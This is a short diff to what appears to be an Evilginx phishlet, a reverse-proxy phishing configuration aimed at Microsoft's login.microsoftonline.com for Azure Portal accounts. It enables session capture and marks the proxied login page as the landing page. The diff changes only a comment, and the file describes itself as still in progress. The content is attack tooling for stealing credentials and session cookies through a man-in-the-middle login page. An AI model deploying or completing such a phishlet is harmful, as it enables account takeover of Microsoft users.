@@ -1,4 +1,4 @@
-#TBA - Still in progress - this phishlet is for the "onmicrosoft" accounts etc
+#TBA - Still in progress - this phishlet is for Microsoft Azure Portal
 min_ver: '3.0.0'
 proxy_hosts:
   - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true }
